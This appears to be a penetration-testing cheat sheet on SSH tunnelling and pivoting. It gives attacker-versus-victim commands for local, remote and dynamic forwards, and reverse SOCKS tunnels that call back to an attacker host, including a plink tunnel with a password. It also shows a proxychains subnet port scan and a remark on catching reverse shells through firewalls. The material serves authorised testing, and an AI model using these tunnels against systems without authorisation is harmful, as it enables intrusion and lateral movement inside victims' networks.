---
title: SSH Tunnels & Port Forwarding
category: pivoting
description: Local, remote, and dynamic SSH forwards.
tags: [pivot, ssh, tunnel]
os: [any]
order: 10
---

## Local forward (attacker → reach service on victim's side)

```bash
ssh -N -L 8888:internal:80 {{USER}}@{{RHOST}}
# Now: http://127.0.0.1:8888 → internal:80 from victim's perspective
```

## Remote forward (push attacker's service onto victim)

```bash
ssh -N -R 4444:127.0.0.1:4444 {{USER}}@{{RHOST}}
# Now victim's 127.0.0.1:4444 → attacker's :4444
# Useful for catching reverse shells through firewalls.
```

## Dynamic / SOCKS (most flexible)

```bash
ssh -N -D 1080 {{USER}}@{{RHOST}}
# Then on attacker:
proxychains -q nmap -sT -Pn -p- 10.0.0.0/24
proxychains -q firefox
```

`/etc/proxychains4.conf` (last line):

```text
socks5 127.0.0.1 1080
```

## Reverse SOCKS (no inbound on victim)

```bash
# From victim:
ssh -N -R 1080 {{USER}}@{{LHOST}}     # OpenSSH 7.6+
# On attacker uses 127.0.0.1:1080 as SOCKS
```

## Multi-hop / ProxyJump

```bash
ssh -J jump1@1.2.3.4,jump2@10.0.0.5 deep@10.10.10.10
```

## Background, persist & control socket

```bash
ssh -fNT -L 8888:internal:80 {{USER}}@{{RHOST}}
ssh -fNT -D 1080 -o ControlMaster=auto -o ControlPath=~/.ssh/cm-%r@%h:%p {{USER}}@{{RHOST}}
ssh -O check -S ~/.ssh/cm-%r@%h:%p {{USER}}@{{RHOST}}
ssh -O exit  -S ~/.ssh/cm-%r@%h:%p {{USER}}@{{RHOST}}
```

## sshuttle (transparent VPN-ish, no SOCKS)

```bash
sshuttle -r {{USER}}@{{RHOST}} 10.0.0.0/24 --dns
```

## Plink (Windows SSH client) reverse tunnel

```cmd
plink.exe -ssh -l {{USER}} -pw 'pass' -R 4444:127.0.0.1:4444 {{LHOST}}
```
